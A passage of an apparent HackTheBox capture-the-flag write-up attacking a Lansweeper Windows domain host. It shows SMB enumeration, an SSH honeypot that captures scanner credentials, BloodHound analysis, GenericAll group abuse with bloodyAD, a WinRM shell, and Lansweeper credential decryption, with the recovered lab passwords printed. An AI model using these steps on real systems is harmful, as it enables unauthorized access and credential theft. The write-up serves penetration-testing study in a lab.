SMB         10.129.234.177  445    INVENTORY        [*] Enumerated shares
SMB         10.129.234.177  445    INVENTORY        Share           Permissions     Remark
SMB         10.129.234.177  445    INVENTORY        -----           -----------     ------
SMB         10.129.234.177  445    INVENTORY        ADMIN$                          Remote Admin
SMB         10.129.234.177  445    INVENTORY        C$                              Default share
SMB         10.129.234.177  445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
SMB         10.129.234.177  445    INVENTORY        IPC$            READ            Remote IPC
SMB         10.129.234.177  445    INVENTORY        Lansweeper$     READ            Lansweeper Actions
SMB         10.129.234.177  445    INVENTORY        NETLOGON        READ            Logon server share 
SMB         10.129.234.177  445    INVENTORY        SYSVOL          READ            Logon server share 

```

Login success , but nothing standing out

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ smbclient -U sweep/intern '//inventory.sweep.vl/Lansweeper$' 
Password for [SWEEP\intern]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Feb  9 03:46:08 2024
  ..                                  D        0  Fri Feb  9 03:47:44 2024
  changeallowed.vbs                   A      704  Tue Jan 30 09:47:08 2024
  changepassword.vbs                  A      604  Tue Jan 30 09:47:08 2024
  CookComputing.XmlRpcV2.dll          A   117000  Tue Jan 30 09:47:08 2024
  Devicetester.exe                    A   859944  Tue Jan 30 09:52:42 2024
  Heijden.Dns.dll                     A    52520  Tue Jan 30 09:52:08 2024
  mustchangepassword.vbs              A      226  Tue Jan 30 09:47:08 2024
  putty.exe                           A  1180904  Tue Jan 30 09:47:08 2024
  shellexec.vbs                       A      107  Tue Jan 30 09:47:08 2024
  SMBLibrary.dll                      A   327976  Tue Jan 30 09:52:10 2024
  testconnection.exe                  A   375592  Tue Jan 30 09:52:46 2024
  unlock.vbs                          A      174  Tue Jan 30 09:47:08 2024
  Utilities.dll                       A    40232  Tue Jan 30 09:52:14 2024
  vimservice25.dll                    A  1170512  Tue Jan 30 09:47:08 2024
  vimservice25.xmlserializers.dll      A  4353104  Tue Jan 30 09:47:08 2024
  vimservice40.dll                    A  1690704  Tue Jan 30 09:47:08 2024
  vimservice40.xmlserializers.dll      A  6630480  Tue Jan 30 09:47:08 2024
  vimservice41.dll                    A  1813584  Tue Jan 30 09:47:08 2024
  vimservice41.xmlserializers.dll      A  7085136  Tue Jan 30 09:47:08 2024
  vimservice50.dll                    A  2079384  Tue Jan 30 09:47:08 2024
  vimservice50.xmlserializers.dll      A  7957144  Tue Jan 30 09:47:08 2024
  vimservice51.dll                    A  2313296  Tue Jan 30 09:47:08 2024
  vimservice51.xmlserializers.dll      A  8395856  Tue Jan 30 09:47:08 2024
  vimservice55.dll                    A  2448464  Tue Jan 30 09:47:08 2024
  vimservice55.xmlserializers.dll      A  8862800  Tue Jan 30 09:47:08 2024
  vmware.vim.dll                      A  1482456  Tue Jan 30 09:47:08 2024
  wol.exe                             A   198040  Tue Jan 30 09:47:08 2024
  XenServer.dll                       A   818976  Tue Jan 30 09:52:40 2024

                5048575 blocks of size 4096. 1048155 blocks available
smb: \> 
```

No data leak , will back later if the website dont have anything

### Web 82 back

Login as the intern : intern\
![Pasted image 20260406215813.png](/ob/Pasted%20image%2020260406215813.png)

The scanning page has the scanning credentials , but i cant check the password even changed the source code 's type in the debug mode\
![Pasted image 20260406220344.png](/ob/Pasted%20image%2020260406220344.png)

### Intercept Credential

{{< toggle "Tag 🏷️" >}}

{{< tag "SSH-honeyPot" >}} setting up the SSH honeyPot for the scaning tools to send us the ssh password for login in lansweep by sshesame

{{< /toggle >}}

Intercepting the credential by creating the python ssh honoeyPoT

I’ll “Add Scanning Target” on the Scanning targets page. Rather than define an asset and asset group, I’ll pick “IP Range” as the target type, giving it my VPN IP:\
![Pasted image 20260406221956.png](/ob/Pasted%20image%2020260406221956.png)

On the “Scanning credentials” page, I’ll click the “Map Credential” button, select my IP range and enable all the credentials (though only “Inventory Linux” really matters here):

![Pasted image 20260406222129.png](/ob/Pasted%20image%2020260406222129.png)

Used the https://github.com/jaksi/sshesame to make the ssh honneyPot to get the password , but it also can capture by python

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ git clone https://github.com/jaksi/sshesame.git
Cloning into 'sshesame'...
remote: Enumerating objects: 1602, done.
remote: Counting objects: 100% (380/380), done.
remote: Compressing objects: 100% (186/186), done.
remote: Total 1602 (delta 220), reused 194 (delta 194), pack-reused 1222 (from 2)
Receiving objects: 100% (1602/1602), 6.91 MiB | 12.20 MiB/s, done.
Resolving deltas: 100% (927/927), done.
                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cd sshesame
                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ 
                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ go build            
go: downloading github.com/jaksi/sshutils v0.0.13
go: downloading github.com/adrg/xdg v0.5.0
go: downloading github.com/prometheus/client_golang v1.19.1
go: downloading golang.org/x/crypto v0.25.0
go: downloading golang.org/x/term v0.22.0
go: downloading gopkg.in/yaml.v2 v2.4.0
go: downloading github.com/beorn7/perks v1.0.1
go: downloading github.com/cespare/xxhash/v2 v2.2.0
go: downloading github.com/prometheus/client_model v0.5.0
go: downloading github.com/prometheus/common v0.48.0
go: downloading google.golang.org/protobuf v1.33.0
go: downloading github.com/prometheus/procfs v0.12.0
go: downloading golang.org/x/sys v0.22.0
                                                
```

Get their example to change

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ vim ./sshesame.yaml                                                   
```

Modify it the ssh listening Port on the 2022

{{< code >}}\
server:

listen\_address: 10.10.16.13:2022

# Host private key files.

# If unspecified, null or empty, an RSA, ECDSA and Ed25519 key will be generated and stored.

host\_keys: null

# Fake internal services for handling direct-tcpip channels (`ssh -L`).

# If unspecified or null, sensible defaults will be used.

# If empty, no direct-tcpip channels will be accepted.

tcpip\_services:

25: SMTP

80: HTTP

110: POP3

587: SMTP

8080: HTTP

logging:

# The log file to output activity logs to. Debug and error logs are still written to standard error.

# If unspecified or null, activity logs are written to standard out.

file: null

# Make activity logs JSON-formatted instead of human readable.

json: false

# Include timestamps in the logs.

timestamps: true

# Log full raw details of all global requests, channels and channel requests.

debug: false

# Address to export and serve prometheus metrics on.

# If unspecified or null, metrics are not served.

metrics\_address: null

# When logging in JSON, log addresses as objects including the hostname and the port instead of strings.

split\_host\_port: false

auth:

# Allow clients to connect without authenticating.

no\_auth: false

# The maximum number of authentication attempts permitted per connection.

# If set to a negative number, the number of attempts are unlimited.

# If unspecified, null or zero, a sensible default is used.

max\_tries: 0

password\_auth:

# Offer password authentication as an authentication option.

enabled: true

# Accept all passwords.

accepted: true

public\_key\_auth:

# Offer public key authentication as an authentication option.

enabled: true

# Accept all public keys.

accepted: false

keyboard\_interactive\_auth:

# Offer keyboard interactive authentication as an authentication option.

enabled: false

# Accept all keyboard interactive answers.

accepted: false

# Instruction for the keyboard interactive authentication.

instruction: Answer these weird questions to log in!

questions:

* text: "User: " # Keyboard interactive authentication question text.

echo: true # Enable echoing the answer.

* text: "Password: "

echo: false

ssh\_proto:

# The version identification string to announce in the public handshake.

# If unspecified or null, a reasonable default is used.

# Note that RFC 4253 section 4.2 requires that this string start with "SSH-2.0-".

version: SSH-2.0-sshesame

# Sent to the client after key exchange completed but before authentication.

# If unspecified or null, a reasonable default is used.

# If empty, no banner is sent.

banner: This is an SSH honeypot. Everything is logged and monitored.

# The maximum number of bytes sent or received after which a new key is negotiated. It must be at least 256.

# If unspecified, null or 0, a size suitable for the chosen cipher is used.

rekey\_threshold: 0

# The allowed key exchanges algorithms.

# If unspecified or null, a default set of algorithms is used.

key\_exchanges: null

# The allowed cipher algorithms.

# If unspecified or null, a sensible default is used.

ciphers: null

# The allowed MAC algorithms.

# If unspecified or null, a sensible default is used.

macs: null\
{{< /code >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ ./sshesame --config sshesame.yaml
INFO 2026/04/06 22:37:25 No host keys configured, using keys at "/home/parallels/.local/share/sshesame"
INFO 2026/04/06 22:37:25 Listening on 10.10.16.13:2022

```

Get the password 0|5m-U6?/uAX

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ ./sshesame --config sshesame.yaml
INFO 2026/04/06 23:49:52 No host keys configured, using keys at "/home/parallels/.local/share/sshesame"
INFO 2026/04/06 23:49:52 Listening on 10.10.16.13:2022
WARNING 2026/04/06 23:53:53 Failed to accept connection: Failed to establish SSH server connection: EOF
WARNING 2026/04/06 23:54:04 Failed to accept connection: Failed to establish SSH server connection: ssh: disconnect, reason 11: Session closed
2026/04/06 23:54:04 [10.129.234.177:56454] authentication for user "svc_inventory_lnx" without credentials rejected
2026/04/06 23:54:04 [10.129.234.177:56454] authentication for user "svc_inventory_lnx" with password "0|5m-U6?/uAX" accepted
2026/04/06 23:54:04 [10.129.234.177:56454] connection with client version "SSH-2.0-RebexSSH_5.0.8372.0" established
2026/04/06 23:54:04 [10.129.234.177:56454] [channel 0] session requested
2026/04/06 23:54:04 [10.129.234.177:56454] [channel 0] command "uname" requested
2026/04/06 23:54:04 [10.129.234.177:56454] [channel 0] closed
2026/04/06 23:54:04 [10.129.234.177:56454] connection closed
2026/04/06 23:54:04 [10.129.234.177:56459] authentication for user "svc_inventory_lnx" without credentials rejected
2026/04/06 23:54:04 [10.129.234.177:56459] authentication for user "svc_inventory_lnx" with password "0|5m-U6?/uAX" accepted
2026/04/06 23:54:04 [10.129.234.177:56459] connection with client version "SSH-2.0-RebexSSH_5.0.8372.0" established
2026/04/06 23:54:05 [10.129.234.177:56459] [channel 0] session requested
2026/04/06 23:54:05 [10.129.234.177:56459] [channel 0] PTY using terminal "xterm" (size 80x25) requested
2026/04/06 23:54:05 [10.129.234.177:56459] [channel 0] shell requested
2026/04/06 23:54:05 [10.129.234.177:56459] [channel 0] input: "smclp"
2026/04/06 23:54:05 [10.129.234.177:56459] [channel 0] input: "show system1"
WARNING 2026/04/06 23:54:15 Error sending CRLF: EOF
2026/04/06 23:54:15 [10.129.234.177:56459] [channel 0] closed
2026/04/06 23:54:15 [10.129.234.177:56459] connection closed

****
```

### bloodhound

{{< toggle "Tag 🏷️" >}}

{{< tag "netexec-bloodhound" >}} Collecting the bloodhound data form netexec ldap

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX' --bloodhound -c All --dns-server 10.129.234.177
LDAP        10.129.234.177  389    INVENTORY        [*] Windows Server 2022 Build 20348 (name:INVENTORY) (domain:sweep.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.234.177  389    INVENTORY        [+] sweep.vl\svc_inventory_lnx:0|5m-U6?/uAX 
LDAP        10.129.234.177  389    INVENTORY        Resolved collection methods: group, psremote, container, objectprops, session, dcom, trusts, rdp, localadmin, acl
LDAP        10.129.234.177  389    INVENTORY        Done in 0M 11S
LDAP        10.129.234.177  389    INVENTORY        Compressing output into /home/parallels/.nxc/logs/INVENTORY_10.129.234.177_2026-04-06_232618_bloodhound.zip
                                                                                                                            
```

{{< toggle "Tag 🏷️" >}}

{{< tag "bloodhound-setup" >}} setting up the bloodhound 's  database and GUI  in any platform\
{{< /toggle >}}

Install the bloodhound

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ bloodhound 

 It seems it's the first time you run bloodhound

 Please run bloodhound-setup first

Do you want to run bloodhound-setup now? [Y/n] y

 [*] Starting PostgreSQL service

 [*] Creating Database
WARNING:  database "postgres" has a collation version mismatch
DETAIL:  The database was created using collation version 2.41, but the operating system provides version 2.42.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE postgres REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.

 Creating database user
WARNING:  database "postgres" has a collation version mismatch
DETAIL:  The database was created using collation version 2.41, but the operating system provides version 2.42.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE postgres REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
WARNING:  database "postgres" has a collation version mismatch
DETAIL:  The database was created using collation version 2.41, but the operating system provides version 2.42.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE postgres REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.

 Creating database
WARNING:  database "postgres" has a collation version mismatch
DETAIL:  The database was created using collation version 2.41, but the operating system provides version 2.42.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE postgres REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
createdb: error: database creation failed: ERROR:  template database "template1" has a collation version mismatch
DETAIL:  The template database was created using collation version 2.41, but the operating system provides version 2.42.
HINT:  Rebuild all objects in the template database that use the default collation and run ALTER DATABASE template1 REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
psql: error: connection to server on socket "/var/run/postgresql/.s.PGSQL.5432" failed: FATAL:  database "bloodhound" does not exist

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ # 1. Ensure the PostgreSQL service is running
sudo systemctl start postgresql

# 2. Refresh the postgres database collation
sudo -u postgres psql -c "ALTER DATABASE postgres REFRESH COLLATION VERSION;"

# 3. Refresh the template1 database collation (this is the one blocking bloodhound)
sudo -u postgres psql -c "ALTER DATABASE template1 REFRESH COLLATION VERSION;"
WARNING:  database "postgres" has a collation version mismatch
DETAIL:  The database was created using collation version 2.41, but the operating system provides version 2.42.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE postgres REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
NOTICE:  changing version from 2.41 to 2.42
ALTER DATABASE
NOTICE:  changing version from 2.41 to 2.42
ALTER DATABASE
                                                                                                                                                                                                                                            
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ bloodhound-setup

 [*] Starting PostgreSQL service

 [*] Creating Database
User _bloodhound already exists in PostgreSQL

 Creating database
ALTER ROLE

 [*] Starting neo4j
Neo4j is not running.
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:62169). It is available at http://localhost:7474
There may be a short delay until the server is ready.

 [i] You need to change the default password for neo4j
     Default credentials are user:neo4j password:neo4j

 [!] IMPORTANT: Once you have setup the new password, please update /etc/bhapi/bhapi.json with the new password before running bloodhound
..................
 opening http://localhost:7474/
                                                                                                                                                                                                                                            
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]

```

![Pasted image 20260406233528.png](/ob/Pasted%20image%2020260406233528.png)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ sudo vim /etc/bhapi/bhapi.json 

```

{{< code >}}\
{\
"database": {\
"addr": "localhost:5432",\
"username": "\_bloodhound",\
"secret": "bloodhound",\
"database": "bloodhound"\
},\
"neo4j": {\
"addr": "localhost:7687",\
"username": "neo4j",\
"secret": "P@ssw0rd"\
},\
"default\_admin": {\
"principal\_name": "admin",\
"password": "admin",\
"first\_name": "Bloodhound",\
"last\_name": "Kali"\
}

{{< /code >}}

after step up , run the bloodhound

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/sshesame]
└─$ bloodhound

 Starting neo4j
Neo4j is running at pid 62169

 Bloodhound will start

 IMPORTANT: It will take time, please wait...

{"time":"2026-04-06T23:37:31.070475454+08:00","level":"INFO","message":"Reading configuration found at /etc/bhapi/bhapi.json"}
{"time":"2026-04-06T23:37:31.071670912+08:00","level":"INFO","message":"Logging configured","log_level":"INFO"}
{"time":"2026-04-06T23:37:31.110933412+08:00","level":"INFO","message":"No database driver has been set for migration, using: neo4j"}
{"time":"2026-04-06T23:37:31.111001995+08:00","level":"INFO","message":"Connecting to graph using Neo4j"}
{"time":"2026-04-06T23:37:31.112138579+08:00","level":"INFO","message":"Starting daemon Tools API"}
{"time":"2026-04-06T23:37:31.112906079+08:00","level":"INFO","message":"DogTags provider initialized","namespace":"dogtags","provider":"NoopProvider"}
{"time":"2026-04-06T23:37:31.112917079+08:00","level":"INFO","message":"DogTags Configuration","namespace":"dogtags","flags":{"auth.environment_targeted_access_control":false,"privilege_zones.label_limit":0,"privilege_zones.multi_tier_analysis":false,"privilege_zones.tier_limit":1}}
{"time":"2026-04-06T23:37:31.116517204+08:00","level":"INFO","message":"This is a new SQL database. Initializing schema..."}
{"time":"2026-04-06T23:37:31.116527162+08:00","level":"INFO","message":"Creating migration schema..."}
{"time":"2026-04-06T23:37:31.118767787+08:00","level":"INFO","message":"Executing SQL migrations","version":"v0.0.0"}
{"time":"2026-04-06T23:37:31.165381829+08:00","level":"INFO","message":"Executing SQL migrations","version":"v6.1.0"}
{"time":"2026-04-06T23:37:31.170918787+08:00","level":"INFO","message":"Executing SQL migrations","version":"v6.2.0"}
{"time":"2026-04-06T23:37:31.17218062+08:00","level":"INFO","message":"Executing SQL migrations","version":"v6.3.0"}
{"time":"2026-04-06T23:37:31.173275204+08:00","level":"INFO","message":"Executing SQL migrations","version":"v6.4.0"}
{"time":"2026-04-06T23:37:31.173688787+08:00","level":"INFO","message":"Executing SQL migrations","version":"v7.1.0"}
{"time":"2026-04-06T23:37:31.174367787+08:00","level":"INFO","message":"Executing SQL migrations","version":"v7.2.0"}
{"time":"2026-04-06T23:37:31.174702704+08:00","level":"INFO","message":"Executing SQL migrations","version":"v7.3.0"}
{"time":"2026-04-06T23:37:31.178644954+08:00","level":"INFO","message":"Executing SQL migrations","version":"v7.4.0"}
{"time":"2026-04-06T23:37:31.18428462+08:00","level":"INFO","message":"Executing SQL migrations","version":"v7.5.0"}
{"time":"2026-04-06T23:37:31.184757245+08:00","level":"INFO","message":"Executing SQL migrations","version":"v7.6.0"}
{"time":"2026-04-06T23:37:31.185416954+08:00","level":"INFO","message":"Executing SQL migrations","version":"v8.0.0"}
{"time":"2026-04-06T23:37:31.186855037+08:00","level":"INFO","message":"Executing SQL migrations","version":"v8.1.0"}
{"time":"2026-04-06T23:37:31.191214912+08:00","level":"INFO","message":"Executing SQL migrations","version":"v8.2.0"}
{"time":"2026-04-06T23:37:31.19191512+08:00","level":"INFO","message":"Executing SQL migrations","version":"v8.3.0"}
{"time":"2026-04-06T23:37:31.200597995+08:00","level":"INFO","message":"Executing SQL migrations","version":"v8.4.0"}
{"time":"2026-04-06T23:37:31.202094829+08:00","level":"INFO","message":"Executing SQL migrations","version":"v8.5.0"}
{"time":"2026-04-06T23:37:31.212698787+08:00","level":"INFO","message":"Executing SQL migrations","version":"v8.5.1"}
{"time":"2026-04-06T23:37:31.213504037+08:00","level":"INFO","message":"Executing SQL migrations","version":"v8.6.0"}
{"time":"2026-04-06T23:37:31.216406204+08:00","level":"INFO","message":"Executing SQL migrations","version":"v8.7.0"}
Password has been set from existing config or environment variable
{"time":"2026-04-06T23:37:34.215693247+08:00","level":"ERROR","message":"Failed starting the server: failed to start services: graph migration error: Neo4jError: Neo.ClientError.Security.Unauthorized (The client is unauthorized due to authentication failure.)"}


```

In the http://127.0.0.1:8080/ui/login , login as the admin : admin\
![Pasted image 20260406234331.png](/ob/Pasted%20image%2020260406234331.png)Now you can use the bloodhound

### Analyze bloodhound

![Pasted image 20260406235756.png](/ob/Pasted%20image%2020260406235756.png)

add to Owned

![Pasted image 20260406235834.png](/ob/Pasted%20image%2020260406235834.png)

SVC\_INVENTORY\_LNX has the GenericAll to  ADMINS@SWEEP.VL

![Pasted image 20260407000009.png](/ob/Pasted%20image%2020260407000009.png)

Also chech the Member  of ADMINS@SWEEP.VL

![Pasted image 20260407000246.png](/ob/Pasted%20image%2020260407000246.png)

Is the Remote management

### GenericALL

{{< toggle "Tag 🏷️" >}}

{{< tag "bloodhound-GenericAll" >}} Abusing the GenericAll path by bloodyAD in the bloodhound with linux

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX' add groupMember "Lansweeper Admins" svc_inventory_lnx
[+] svc_inventory_lnx added to Lansweeper Admins
```

Using the bloodyAD to add the target if there is GenericALL in bloodhound

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
WINRM       10.129.234.177  5985   INVENTORY        [*] Windows Server 2022 Build 20348 (name:INVENTORY) (domain:sweep.vl) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.177  5985   INVENTORY        [+] sweep.vl\svc_inventory_lnx:0|5m-U6?/uAX (Pwn3d!)

```

### evil-winrm-py

Due to in the remote group , so now we can evil-winrm-py

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ evil-winrm-py -i inventory.sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'

          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'inventory.sweep.vl:5985' as 'svc_inventory_lnx'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\svc_inventory_lnx\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
evil-winrm-py PS C:\Users\svc_inventory_lnx\Documents> whoami
sweep\svc_inventory_lnx

```

# Shell as Admin

### Enum

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-lansweeper" >}} Enumerating revealed an installation of lansweeper of the configuration file (web.config) disclosed the database connection parameters, including an encrypted database password which can be decoded  by LansweeperDecrypt.ps1 to have the admin password and logged with evil-winrm-py.\
{{< /toggle >}}\
The filesystem is pretty empty. There are a couple other users on the box, but svc\_inventory\_lnx can’t access their home directories:

```
evil-winrm-py PS C:\users> ls

    Directory: C:\users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/10/2024   6:31 AM                Administrator
d-----         2/10/2024   6:25 AM                intern
d-----         2/10/2024   6:25 AM                jgre808
d-r---          2/8/2024  10:42 AM                Public
d-----          8/8/2025   5:16 AM                svc_inventory_lnx   
```

lansweeper is installed in`\Program Filesd (x86)`:

```
evil-winrm-py PS C:\Program Files (x86)\Lansweeper> ls

    Directory: C:\Program Files (x86)\Lansweeper

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/8/2024  11:46 AM                Actions
d-----          2/8/2024  11:46 AM                Client
d-----          2/8/2024  11:51 AM                IISexpress
d-----          2/8/2024  11:54 AM                Install
d-----          2/8/2024  11:48 AM                Key
d-----          2/8/2024  11:46 AM                PackageShare
d-----         2/10/2024   6:56 AM                Service
d-----          2/8/2024  11:46 AM                SQL script
d-----          2/8/2024  11:48 AM                SQLData
d-----          2/8/2024  11:47 AM                Start
d-----          2/8/2024  11:47 AM                Tools
d-----          2/8/2024  11:46 AM                WebPiCmd
d-----          2/8/2024  11:53 AM                Website
-a----         1/29/2024   5:53 PM        1556256 isxlansw.dll
-a----          2/8/2024  11:47 AM        1208673 unins000.dat
-a----          2/8/2024  11:40 AM        1201960 unins000.exe
-a----          2/8/2024  11:47 AM          22761 unins000.msg  
```

lansweeper keeps it’s credentials in the database. The connection string is in the `web.config` file in `Website`:

```
evil-winrm-py PS C:\Program Files (x86)\Lansweeper> cat Website\web.config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
...[snip]...
        <connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">
  <EncryptedData>
   <CipherData>
    <CipherValue>AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAgzIANE59TESof+KDtzRrYgQAAAACAAAAAAAQZgAAAAEAACAAAADZXXb0nohQo/8w0EjMuxtdrsO+oWE/8nDm/sEaWGOh3wAAAAAOgAAAAAIAACAAAACklghdDLbVFPEM7B4ZpcRybvQgCHDDtgwAAeT5KyzVWtACAADAF3FYUr4SCYc5HSnHnnc6kNS4Rfc09lvTGIzwlOXXrMq2BXQ2rAKsHAKs6u4MLg7AbsuSQ5uXFoLv5gq+G7I7lLKnkjwZtj9q74RubSt1adkMEftUASe1UXOKoZMzjfSat7c80do1he16BvzrxMq4WZ9CMUt7L6oGYCGHLHKWClFNDfCjZpp1nqZMcEylVkz5zgayHZYhAW9C4+NATr+QLm1EGKNeZUmyW+oLkOkuvlj4OLonw1OY8DVMafH0MWY0tRmiFYwVzRpydb0Cw2Ms1rRy9EdLB570Qb45LVE4DqM43oHepfC+dqg0qScPdHxLdtHcWyeKgSlEHvML5kn/9G9g5DCX9QCtTgfVKU30A8zlc1BMYAn9Th0EEUW3UXHRMu+w1QAQmoeCcRN1V0LTtmjvEHazumgtfBXElHKvU3brBJDvyCHtGY9GVXs/Mhn5X9JrLYuP26Tx00vhfRd+jWuiiIVZarLSf/ZPVjBoKQQzHU6S2Aj2IV3tG7vdnrqPScIj3lhCeLhjEEAlLkdOoBefaeIST02PqWYTH6+mQODIp1XeWkhpCYN5ZFZG/vCdy938e159Cz2Bs57JQ7/3gY+RXbXth6/AqK3aiwfxc2qWAnpUazIS8ZYppqnwYSwXOoGtF1N8qUrOO3xYIyC23SgtpsnRibGNPauCzkryg+oQ0kSBYyQsVfUzhgPsXkdhvEPC7yVJ0cfbqYun/Mv00opCSYM0dOMvqaljKFoeraDIlqEqSJwouD80YXVPRhRnajr6hzTUVrMXlXImbWev4NAAjilyjQs3BYGJy5nbx1mkNn9AeWlInBFkmV0oLwy++Ap8tShR6CZoxv6OiR04W5pCAUYxdgERr/aQXvSVXFL2apxfE+oHxSDrzzH9bI82eejiDgjI4PqBrBet+3tMDvGsfjGwElWiy7OfMfhOjgTgggF4SVMYbyWUVGo6gF1AAAAAMOQYm/6r5L1Mzd7iM4dfwt6qqImlYluj/3j03jq2X+4ChPcl4wD9LM5ph9aYnTRNeRHLUeXHvPonZNpB304iLg==</CipherValue>
   </CipherData>
  </EncryptedData>
 </connectionStrings>
 ...[snip]...
```

It’s encrypted. The credentials in the database are also encrypted. The key is stored in `Key\Encryption.txt`:

```
evil-winrm-py PS C:\Program Files (x86)\Lansweeper> ls Key

    Directory: C:\Program Files (x86)\Lansweeper\Key

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          2/8/2024  11:48 AM           1024 Encryption.txt 
```

#### Decrypt

[SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt) handles all of this for me. It will get the connection string from the `web.config` file (and decrypt it if necessary), and then get the credentials from the database and use the key to decrypt those. I can compile the C# into a binary, or use the PowerShell script.

I’ll save [LansweeperDecrypt.ps1](https://github.com/Yeeb1/SharpLansweeperDecrypt/blob/main/LansweeperDecrypt.ps1) to my host, and upload it through `evil-winrm-py`, and run it:

```
evil-winrm-py PS C:\ProgramData> upload LansweeperDecrypt.ps1 LansweeperDecrypt.ps1
Uploading /media/sf_CTFs/hackthebox/sweep-10.129.234.176/LansweeperDecrypt.ps1: 100%|█████████████| 4.07k/4.07k [00:00<00:00, 10.0kB/s]
[+] File uploaded successfully as: C:\ProgramData\LansweeperDecrypt.ps1
evil-winrm-py PS C:\ProgramData> powershell .\LansweeperDecrypt.ps1
[+] Loading web.config file...
[+] Found protected connectionStrings section. Decrypting...
[+] Decrypted connectionStrings section:
<connectionStrings>
    <add name="lansweeper" connectionString="Data Source=(localdb)\.\LSInstance;Initial Catalog=lansweeperdb;Integrated Security=False;User ID=lansweeperuser;Password=Uk2)Dw3!Wf1)Hh;Connect Timeout=10;Application Name=&quot;LsService Core .Net SqlClient Data Provider&quot;" providerName="System.Data.SqlClient" />
</connectionStrings>
[+] Opening connection to the database...
[+] Retrieving credentials from the database...
[+] Decrypting password for user: SNMP Community String
[+] Decrypting password for user: 
[+] Decrypting password for user: SWEEP\svc_inventory_win
[+] Decrypting password for user: svc_inventory_lnx
[+] Credentials retrieved and decrypted successfully:

CredName          Username                Password    
--------          --------                --------    
SNMP-Private      SNMP Community String   private     
Global SNMP                               public      
Inventory Windows SWEEP\svc_inventory_win 4^56!sK&}eA?
Inventory Linux   svc_inventory_lnx       0|5m-U6?/uAX

[+] Database connection closed.
```

The first two entries aren’t that exciting. The forth I already have. But the third is a password for the svc\_inventory\_win account.

#### Shell

Not only do the creds work, but they are administrator:

```
oxdf@hacky$ netexec smb inventory.sweep.vl -u svc_inventory_win -p '4^56!sK&}eA?'
